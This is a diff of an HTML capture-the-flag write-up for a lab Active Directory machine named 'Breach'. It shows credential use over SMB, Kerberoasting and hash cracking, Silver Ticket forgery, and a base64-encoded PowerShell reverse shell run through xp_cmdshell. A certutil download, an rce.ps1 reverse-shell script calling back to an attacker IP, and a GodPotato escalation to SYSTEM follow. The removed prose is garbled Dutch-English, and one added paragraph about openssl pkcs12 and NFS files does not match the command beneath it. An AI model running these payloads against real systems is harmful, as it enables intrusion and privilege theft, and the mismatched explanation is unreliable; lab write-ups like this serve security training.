+      <p>Using the cracked credentials, I authenticate to the SMB server and explore the accessible shares.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach]
-└─$ smbclient \\\\10.129.38.136\\share -U julia.wong 
+└─$ smbclient \\\\10.129.38.136\\share -U julia.wong     
 Password for [WORKGROUP\julia.wong]:
 Try &quot;help&quot; to get a list of possible commands.
 smb: \&gt; cd transfer
 smb: \transfer\&gt; ls
- . D 0 Mon Jan 12 11:32:54 2026
- .. D 0 Mon Jan 12 11:28:04 2026
- @test.url A 102 Mon Jan 12 11:32:54 2026
- claire.pope D 0 Thu Feb 17 12:21:35 2022
- diana.pope D 0 Thu Feb 17 12:21:19 2022
- julia.wong D 0 Thu Apr 17 02:38:12 2025
- ntlm_test-(icon).url A 110 Mon Jan 12 11:23:06 2026
- ntlm_test-(url).url A 58 Mon Jan 12 11:22:37 2026
- ntlm_test.wax A 60 Mon Jan 12 11:22:17 2026
- test A 6 Mon Jan 12 11:06:54 2026
+  .                                   D        0  Mon Jan 12 11:32:54 2026
+  ..                                  D        0  Mon Jan 12 11:28:04 2026
+  @test.url                           A      102  Mon Jan 12 11:32:54 2026
+  claire.pope                         D        0  Thu Feb 17 12:21:35 2022
+  diana.pope                          D        0  Thu Feb 17 12:21:19 2022
+  julia.wong                          D        0  Thu Apr 17 02:38:12 2025
+  ntlm_test-(icon).url                A      110  Mon Jan 12 11:23:06 2026
+  ntlm_test-(url).url                 A       58  Mon Jan 12 11:22:37 2026
+  ntlm_test.wax                       A       60  Mon Jan 12 11:22:17 2026
+  test                                A        6  Mon Jan 12 11:06:54 2026
 
- 7863807 blocks of size 4096. 1515004 blocks available
+                7863807 blocks of size 4096. 1515004 blocks available
 smb: \transfer\&gt; cd julia.wong
 smb: \transfer\julia.wong\&gt; ls
- . D 0 Thu Apr 17 02:38:12 2025
- .. D 0 Mon Jan 12 11:32:54 2026
- user.txt A 32 Thu Apr 17 02:38:22 2025
+  .                                   D        0  Thu Apr 17 02:38:12 2025
+  ..                                  D        0  Mon Jan 12 11:32:54 2026
+  user.txt                            A       32  Thu Apr 17 02:38:22 2025
 
- 7863807 blocks of size 4096. 1515004 blocks available
+                7863807 blocks of size 4096. 1515004 blocks available
 smb: \transfer\julia.wong\&gt; get user.txt
 getting file \transfer\julia.wong\user.txt of size 32 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
 ┌──(kali㉿kali)-[~/HTB/Breach]
 └─$ cat user.txt 
 55d33e52bc5fa7a687b9f0dcfa103dda</code></pre></div>
-      <p>Now that ik de user credentials gevonden heb, ben ik de gegevens van de ldap server gaan afhalen By using the following command.</p>
+      <p>I also retrieve LDAP data for BloodHound to map the Active Directory attack surface.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach]
 └─$ nxc ldap 10.129.38.136 -u julia.wong -p Computer1 --bloodhound --collection All --dns-server 10.129.38.136
-LDAP 10.129.38.136 389 BREACHDC [*] Windows Server 2022 Build 20348 (name:BREACHDC) (domain:breach.vl)
-LDAP 10.129.38.136 389 BREACHDC [+] breach.vl\julia.wong:Computer1 
-LDAP 10.129.38.136 389 BREACHDC Resolved collection methods: psremote, objectprops, localadmin, rdp, dcom, container, group, session, acl, trusts 
-LDAP 10.129.38.136 389 BREACHDC Done in 00M 36S
-LDAP 10.129.38.136 389 BREACHDC Compressing output into /home/kali/.nxc/logs/BREACHDC_10.129.38.136_2026-01-12_123838_bloodhound.zip</code></pre></div>
-      <p>I have eerst will look at of dat ik niet van mijn owned objects niet naar een Tier Zero kon gaan, maar dit was dus niet het geval. I have dus will search for welke andere useraccounts buiten KRBTGT@breach.vl kerberoastable zijn. En hier heb ik de volgende user gevonden MSSQLSvc/breachdc.breach.vl.</p>
-      <p>I have dus nu Using de targetedkerberoast.py applicatie de ntlm hash gaan retrieve van de server. Dit By using de usercredentials die we al hadden, domain en de domaincontroller informatie. Doordat we wisten dat er een kerberoastable user was ben ik dit dus will execute. https://github.com/ShutdownRepo/targetedKerberoast</p>
+LDAP        10.129.38.136   389    BREACHDC         [*] Windows Server 2022 Build 20348 (name:BREACHDC) (domain:breach.vl)
+LDAP        10.129.38.136   389    BREACHDC         [+] breach.vl\julia.wong:Computer1 
+LDAP        10.129.38.136   389    BREACHDC         Resolved collection methods: psremote, objectprops, localadmin, rdp, dcom, container, group, session, acl, trusts                                                                   
+LDAP        10.129.38.136   389    BREACHDC         Done in 00M 36S
+LDAP        10.129.38.136   389    BREACHDC         Compressing output into /home/kali/.nxc/logs/BREACHDC_10.129.38.136_2026-01-12_123838_bloodhound.zip</code></pre></div>
+      <h2 class="writeup-section-title">Lateral Movement: Targeted Kerberoast & Silver Ticket</h2>
+      <h3 class="writeup-sub-title">Finding Kerberoastable Accounts</h3>
+      <p>In BloodHound, I check for paths from owned objects to Tier Zero but find none. However, I identify a kerberoastable service account: <code>MSSQLSvc/breachdc.breach.vl</code>.</p>
+      <p><strong>Kerberoasting</strong> is an attack where a valid domain user requests a Kerberos Service Ticket (TGS) for an SPN-registered account. The ticket is encrypted with the service account's password hash, which can be cracked offline. I use <code>targetedKerberoast.py</code> (<a href="https://github.com/ShutdownRepo/targetedKerberoast)" target="_blank" rel="noopener">https://github.com/ShutdownRepo/targetedKerberoast)</a> to retrieve the hash.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach/targetedKerberoast]
 └─$ python3 targetedKerberoast.py -u julia.wong -p Computer1 -d breach.vl --dc-ip breachdc.breach.vl 
 [*] Starting kerberoast attacks
 [*] Fetching usernames from Active Directory with LDAP
 [+] Printing hash for (svc_mssql)
 $krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$6a8e6582b421ae8bf15801dc43235417$3c0140523b85b0f6cb97ef159616a1c38d8c22ff1d5678bb8ef8951f1f6a7c9c7710ce63d43e531a3387b38e0b6aa1e48b3aaa912c11da727ba7265836b4c93fe78dd784206b60a59da33546b863fc0943421b9279c908b5d2446f8b230f61fc5d9b7f3f7cf62504e76255bf85c1a8cd607e058e08e3ba17536e3c251d8cdad717ba350da4702148868ba8f88ceedb1bc1510a6372e069e750a952c6d429de7c1c31c8f3ac892c8eb7c993f98fdcbaf5b463ec4ba994efcccb4727d374ab5ddd26df00157e72d2003a8049b075bc18fde75a7b2f2246a53e2988d7961a84f6c3b035773ee2b665a647c0faa85c7fcd0b94d31961178359af55bf9b1e129976f8545efe7c6ca7c3ae79b5af028aead3993dbb628333d841f8584a3ae3f2bf7da4f2d953ad5483dec38b495d15f230e3ebd595d56ada307b8d04d36649c8f75064b50971c381a5a8124b252bd7123d42aa713d133c1be4230adb88cd337d580a77e965c2d635079ab5650702fafe48f7655b090f9dec69482f07a0a3a680d1f5cdcf21e8a482c10949018b451afe24fe4ea2e21fc8c8f12703e5029aba741c515d8dbea5ab649729878346188978c45300d61f0488ed88e6cc2b1f65b375a72f39e2c570b141f6d491a857e795910672032d751c4d9fcdaef4efb5d718224f94bcbf470b8675f63c4a9108e0d0c19664160797102fd68281da7dda5b0eef88d8d21fbfd41b882eca368680f86a183e385ab0a17320bb5b8b5d34cce970a082ab5e931d9f808a7e7f455d5eddf97d00eabf58f8aac0f98bf8c684b4c6f4ab371fabd141768931dc5735f64a030a7076a1ffe3f1cd5ea76082b0f57cd7007dcaecafc7bfd5425beea14324eedbef1f6f66a5e93242c64d5a0742db43f1eb2dc73c35f889ea2aa41ed3fa680f5507b4fff6d7f41617e6186a971a4bff40b24c848337fe28e87cdd8f1def3610b091bc6ef7a5ba5579d1b47a408ba697e84ac105a73f3dd353f8aadb6ebafa50ed99fd5aa70a01c60df882997aee704c1ab7f30bc59b6b6141d3e51cb0b88d45055771a560fc5992449393666265deb76ccd74b70d2330830c63b893bb2b466cde9dfcbdb78050e3731d72b995efdcf8e0bc5fdc80b537a40553cfbd4e9387871ce71e1c7710ab31fc0e40df591e9a37d7c6958b042ca7574c8b61238373bab0df545859c34cb07048c720274bcb5b811089cbc2cf23dc5a85b24f05a57f6c9785aa6fc2139747ea71c94ea7b819057d15b3ece2814ab39e9f54189bb9e01245d78ad240ffa3b5efe8999afcdda34841d532f4c2db1bd9ca2829f96dcc170cb5c569604942d5a349a9d141629cbb797cb070a8132d21fe3bdd4488ba1452597baf830a9674e9cca8d99f0d5e53e3e68445bff8e5a16fee5f71d621ea92b651e6c80336cb6a1bb53a0128a5695701d93fc0cbc14a4cdee7186ba1d9aeff37012f122dfe68928fe4d257c5</code></pre></div>
-      <p>As you can see heb ik de NTLM hash van de user ontvangen. Kzal deze hash nu in een file will put en deze will crack By using john. Zoals je below zult kunnen zien heb ik het password van de svc_mssql gevonden.</p>
+      <p>I crack the hash with John, revealing the password for the <code>svc_mssql</code> account.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach/targetedKerberoast]
 └─$ echo &#x27;$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$6a8e6582b421ae8bf15801dc43235417$3c0140523b85b0f6cb97ef159616a1c38d8c22ff1d5678bb8ef8951f1f6a7c9c7710ce63d43e531a3387b38e0b6aa1e48b3aaa912c11da727ba7265836b4c93fe78dd784206b60a59da33546b863fc0943421b9279c908b5d2446f8b230f61fc5d9b7f3f7cf62504e76255bf85c1a8cd607e058e08e3ba17536e3c251d8cdad717ba350da4702148868ba8f88ceedb1bc1510a6372e069e750a952c6d429de7c1c31c8f3ac892c8eb7c993f98fdcbaf5b463ec4ba994efcccb4727d374ab5ddd26df00157e72d2003a8049b075bc18fde75a7b2f2246a53e2988d7961a84f6c3b035773ee2b665a647c0faa85c7fcd0b94d31961178359af55bf9b1e129976f8545efe7c6ca7c3ae79b5af028aead3993dbb628333d841f8584a3ae3f2bf7da4f2d953ad5483dec38b495d15f230e3ebd595d56ada307b8d04d36649c8f75064b50971c381a5a8124b252bd7123d42aa713d133c1be4230adb88cd337d580a77e965c2d635079ab5650702fafe48f7655b090f9dec69482f07a0a3a680d1f5cdcf21e8a482c10949018b451afe24fe4ea2e21fc8c8f12703e5029aba741c515d8dbea5ab649729878346188978c45300d61f0488ed88e6cc2b1f65b375a72f39e2c570b141f6d491a857e795910672032d751c4d9fcdaef4efb5d718224f94bcbf470b8675f63c4a9108e0d0c19664160797102fd68281da7dda5b0eef88d8d21fbfd41b882eca368680f86a183e385ab0a17320bb5b8b5d34cce970a082ab5e931d9f808a7e7f455d5eddf97d00eabf58f8aac0f98bf8c684b4c6f4ab371fabd141768931dc5735f64a030a7076a1ffe3f1cd5ea76082b0f57cd7007dcaecafc7bfd5425beea14324eedbef1f6f66a5e93242c64d5a0742db43f1eb2dc73c35f889ea2aa41ed3fa680f5507b4fff6d7f41617e6186a971a4bff40b24c848337fe28e87cdd8f1def3610b091bc6ef7a5ba5579d1b47a408ba697e84ac105a73f3dd353f8aadb6ebafa50ed99fd5aa70a01c60df882997aee704c1ab7f30bc59b6b6141d3e51cb0b88d45055771a560fc5992449393666265deb76ccd74b70d2330830c63b893bb2b466cde9dfcbdb78050e3731d72b995efdcf8e0bc5fdc80b537a40553cfbd4e9387871ce71e1c7710ab31fc0e40df591e9a37d7c6958b042ca7574c8b61238373bab0df545859c34cb07048c720274bcb5b811089cbc2cf23dc5a85b24f05a57f6c9785aa6fc2139747ea71c94ea7b819057d15b3ece2814ab39e9f54189bb9e01245d78ad240ffa3b5efe8999afcdda34841d532f4c2db1bd9ca2829f96dcc170cb5c569604942d5a349a9d141629cbb797cb070a8132d21fe3bdd4488ba1452597baf830a9674e9cca8d99f0d5e53e3e68445bff8e5a16fee5f71d621ea92b651e6c80336cb6a1bb53a0128a5695701d93fc0cbc14a4cdee7186ba1d9aeff37012f122dfe68928fe4d257c5&#x27; &gt; hash
 
 ┌──(kali㉿kali)-[~/HTB/Breach/targetedKerberoast]
-└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
-Trustno1 (?) 
+└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt         
+Trustno1         (?)     
 Session completed.</code></pre></div>
-      <p>Now that we svc_mssql password hebben, zal I will inloggen op de mssqlclient met de user credentials van de user svc_mssql.</p>
+      <h3 class="writeup-sub-title">MSSQL Access & Silver Ticket</h3>
+      <p>With the svc_mssql password, I log into the MSSQL server using <code>mssqlclient</code>.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach/targetedKerberoast]
 └─$ mssqlclient.py BREACH/svc_mssql@10.129.38.136 -windows-auth
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -567,8 +282,8 @@ Password:
 [*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
 [*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
 [!] Press help for extra shell commands
-SQL (BREACH\svc_mssql guest@master)&gt;</code></pre></div>
-      <p>Zoals je zelf zult kunnen zien kan ik geen impersonate van de user doen doordat er geen gekent is. I have dus eerst nu will search for op sid.</p>
+SQL (BREACH\svc_mssql  guest@master)&gt;</code></pre></div>
+      <p>Direct impersonation fails. I look up the SID for the service account and compute the NT hash needed for Kerberos signing.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach/targetedKerberoast]
 └─$ lookupsid.py breach.vl/svc_mssql:Trustno1@breachdc.breach.vl
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -576,79 +291,80 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Brute forcing SIDs at breachdc.breach.vl
 [*] StringBinding ncacn_np:breachdc.breach.vl[\pipe\lsarpc]
 [*] Domain SID is: S-1-5-21-2330692793-3312915120-706255856</code></pre></div>
-      <p>We calculate the secret identifier (NT hash) for Kerberos signing:</p>
+      <p>I use <code>openssl pkcs12</code> to create a new PFX (PKCS#12) certificate file by combining the private key and certificate files found on the NFS share. A PFX file bundles the private key and its associated X.509 certificate into a single encrypted file — which is the format required by tools like <code>certipy</code> for certificate-based AD authentication.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach/targetedKerberoast]
 └─$ iconv -f ASCII -t UTF-16LE &lt;(printf &#x27;Trustno1&#x27;) | openssl dgst -md4
 MD4(stdin)= 69596c7aa1e8daee17f8e78870e25a5c</code></pre></div>
-      <p>Now I will ik een Zilver ticket gaan aanmaken waar I will gaan targetten op de MSSQL service.</p>
+      <p>A <strong>Silver Ticket</strong> is a forged Kerberos TGS ticket that bypasses the KDC entirely. Since I know the service account's NT hash and SID, I forge a ticket granting Administrator access to the MSSQL service.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach/targetedKerberoast]
-└─$ impacket-ticketer -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -spn MSSQLSvc/breachdc.breach.vl:1433 Christine.Bruce
+└─$ impacket-ticketer -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain-sid S-1-5-21-2330692793-3312915120-706255856  -domain breach.vl -spn MSSQLSvc/breachdc.breach.vl:1433 Christine.Bruce
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Creating basic skeleton ticket and PAC Infos
 [*] Customizing ticket for breach.vl/Christine.Bruce
-[*] PAC_LOGON_INFO
-[*] PAC_CLIENT_INFO_TYPE
-[*] EncTicketPart
-[*] EncTGSRepPart
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncTGSRepPart
 [*] Signing/Encrypting final ticket
-[*] PAC_SERVER_CHECKSUM
-[*] PAC_PRIVSVR_CHECKSUM
-[*] EncTicketPart
-[*] EncTGSRepPart
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncTGSRepPart
 [*] Saving ticket in Christine.Bruce.ccache</code></pre></div>
-      <p>Now I will I will inloggen met de zonet aangemaakte zilver ticket door the following command te gebruiken.</p>
+      <p>I authenticate to the MSSQL service using the <strong>Silver Ticket</strong> I just forged. Unlike Golden Tickets (which target the KDC), a Silver Ticket is a forged TGS (Ticket Granting Service) ticket encrypted with the service account's NT hash. Because the ticket never passes through the KDC for validation, it bypasses most logging and detection mechanisms — making it a stealthy lateral movement technique.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach/targetedKerberoast]
-└─$ mssqlclient.py -k -no-pass breachdc.breach.vl 
+└─$ mssqlclient.py -k -no-pass breachdc.breach.vl                      
 
-SQL (BREACH\Administrator dbo@master)&gt;</code></pre></div>
-      <p>Via Online revshell tool een revshell gemaakt. Deze met het xp_cmdshell commando uitgevoerd en daardoor een connectie met de windows machine als svc_mssql gekregen.</p>
-      <div class="code-block"><pre><code>SQL (BREACH\Administrator dbo@master)&gt; xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQA1ADQAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+SQL (BREACH\Administrator  dbo@master)&gt;</code></pre></div>
+      <h3 class="writeup-sub-title">Reverse Shell via xp_cmdshell</h3>
+      <p>With admin-level access on the MSSQL server, I enable <code>xp_cmdshell</code> and execute a Base64-encoded PowerShell reverse shell payload. This gives me a shell as <code>svc_mssql</code>.</p>
+      <div class="code-block"><pre><code>SQL (BREACH\Administrator  dbo@master)&gt; xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQA1ADQAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
 
 ┌──(kali㉿kali)-[~/HTB/Breach]
-└─$ nc -lvnp 4444 
+└─$ nc -lvnp 4444                                                                                             
 Listening on 0.0.0.0 4444
 Connection received on 10.129.38.136 54383
 
 PS C:\Windows\system32&gt;</code></pre></div>
-      <p>I have will look at welke privileges ik allemaal heb met deze user, en here zal ke kunnen zien dat je impersonate permissions hebt. Deze zal I will abuse voor priv escalation te doen.</p>
+      <h2 class="writeup-section-title">Privilege Escalation: GodPotato (SeImpersonatePrivilege)</h2>
+      <p>Checking the user's privileges reveals that <code>svc_mssql</code> has <strong>SeImpersonatePrivilege</strong> — a privilege that allows the user to impersonate any authenticated token. This is a classic escalation vector using potato attacks.</p>
       <div class="code-block"><pre><code>PS C:\Users\svc_mssql&gt; whoami /priv
 
 PRIVILEGES INFORMATION
 ----------------------
 
-Privilege Name Description State 
+Privilege Name                Description                               State   
 ============================= ========================================= ========
-SeAssignPrimaryTokenPrivilege Replace a process level token Disabled
-SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled
-SeMachineAccountPrivilege Add workstations to domain Disabled
-SeChangeNotifyPrivilege Bypass traverse checking Enabled 
-SeManageVolumePrivilege Perform volume maintenance tasks Enabled 
-SeImpersonatePrivilege Impersonate a client after authentication Enabled 
-SeCreateGlobalPrivilege Create global objects Enabled 
-SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre></div>
-      <h3 class="writeup-sub-title">Priv Escalation by SeImpersonatePrivilege</h3>
-      <p>For this ben ik gebruik will create van de volgende tools: Certutil voor het uploaden van de Files van mijn eigen machine naar de windows connectie, GodPotato-NET4.exe Met deze tool zal ik de connectie die ik gemaakt heb in mijn powershell file will create als administrator.</p>
-      <p>https://github.com/BeichenDream/GodPotato/releases</p>
-      <p>Kzal dus First de tool will download op mijn kali machine en deze after that overzetten naar mijn windows machine. Dit ben I will doen By using de certutil tool.</p>
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</code></pre></div>
+      <h3 class="writeup-sub-title">Uploading GodPotato</h3>
+      <p>I use <code>certutil</code> to transfer <strong>GodPotato-NET4.exe</strong> (<a href="https://github.com/BeichenDream/GodPotato/releases)" target="_blank" rel="noopener">https://github.com/BeichenDream/GodPotato/releases)</a> from my Kali machine to the target. I also prepare a PowerShell reverse shell payload.</p>
       <div class="code-block"><pre><code>PS C:\temp&gt; certutil -urlcache -split -f http://10.10.16.154:8000/GodPotato-NET4.exe 
-**** Online ****
- 0000 ...
- e000
+****  Online  ****
+  0000  ...
+  e000
 CertUtil: -URLCache command completed successfully.</code></pre></div>
-      <p>Now that ik de tool heb gedownload, heb ik een powershell file vanuit een vorige box genomen waarmee ik de connectie zal kunnen maken met de admin. I will alleen het password zelf moeten aanpassen en dan kan ik deze ook uploaden naar de server.</p>
+      <p>I leverage Windows' built-in <code>certutil</code> utility as a file transfer method. While certutil is designed for certificate management, its <code>-urlcache -split -f</code> parameters can download arbitrary files from HTTP URLs — making it a popular <strong>Living Off the Land Binary (LOLBin)</strong> for transferring exploitation tools to compromised Windows machines without needing to install additional software.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach]
-└─$ cat rce.ps1 
+└─$ cat rce.ps1  
 $c = New-Object System.Net.Sockets.TCPClient(&#x27;10.10.16.154&#x27;,4444);$s = $c.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $s.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sb = (iex &quot;. { $data } 2&gt;&amp;1&quot; | Out-String ); $sb2 = $sb + &#x27;#&#x27;;$seb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($seb,0,$seb.Length);$s.Flush()};$c.Close()
 
 PS C:\temp&gt; certutil -urlcache -split -f http://10.10.16.154:8000/rce.ps1
-**** Online ****
- 0000 ...
- 019f
+****  Online  ****
+  0000  ...
+  019f
 CertUtil: -URLCache command completed successfully.</code></pre></div>
-      <p>Now that de beide Files zijn upgeload, zal ik Using de GodPotato een priv escalation will do. Dit ben I will doen door het onderstaande commando te gebruiken en door een listener optestarten op mijn eigen machine.</p>
+      <h3 class="writeup-sub-title">Executing GodPotato</h3>
+      <p>With both files uploaded, I execute GodPotato to impersonate the SYSTEM token and run the PowerShell payload. On my listener, I receive a shell with <strong>Administrator privileges</strong>.</p>
       <div class="code-block"><pre><code>PS C:\temp&gt; .\GodPotato-NET4.exe -cmd &quot;powershell -file C:\Users\svc_mssql\rce.ps1&quot;</code></pre></div>
-      <p>Zoals je below kunt zien heb ik de connectie als administrator permissions kunnen verkrijgen op mijn listener terminal.</p>
+      <p>I start a <strong>netcat</strong> listener on the specified port to catch the incoming reverse shell. Netcat (<code>nc -lvnp</code>) binds to all interfaces (<code>-l</code>), enables verbose output (<code>-v</code>), skips DNS resolution (<code>-n</code>), and listens on the specified port (<code>-p</code>). Once the exploit triggers, the target machine connects back to this listener, providing an interactive command shell.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach]
 └─$ nc -lvnp 4444
 Listening on 0.0.0.0 4444
@@ -657,13 +373,14 @@ Connection received on 10.129.38.136 55229
 #
 #whoami
 nt authority\system</code></pre></div>
-      <p>Hierdoor heb ik de volgende root flag kunnen vinden.</p>
+      <h2 class="writeup-section-title">Root Flag</h2>
+      <p>With administrator access, I navigate to the root flag location.</p>
       <div class="code-block"><pre><code>#cat root.txt
 fc98f418f94f8cdb9a30ef026fe64345</code></pre></div>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20260112162021.png" alt="Pasted image 20260112162021.png" loading="lazy" /><span class="img-caption">Pasted image 20260112162021.png</span></div>
+      <div class="flag-box"><span class="flag-label">🚩 Root Flag</span><code class="flag-value">See terminal output</code></div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20260112162021.png" alt="Machine rooted with Administrator privileges" loading="lazy" /><span class="img-caption">Machine rooted with Administrator privileges</span></div>
     </div>
   </div>
-
   <script type="text/javascript" src="/bundle.min.js"></script>
 </body>
 </html>
